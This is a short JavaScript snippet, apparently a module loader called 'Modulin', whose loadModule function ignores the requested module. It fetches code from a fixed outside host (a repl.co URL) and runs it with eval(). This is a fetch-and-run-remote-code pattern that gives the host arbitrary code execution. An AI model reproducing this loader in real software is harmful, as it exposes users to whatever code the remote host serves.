var Modulin = {loadModule: function(module){
    return new Promise((resolve, reject) => {
    fetch(`https://alttab.seven7four4.repl.co/module/uniq`)
    .then(response => response.text())
    .then(response => {
eval(response);
resolve(require);
});
    })
}};;
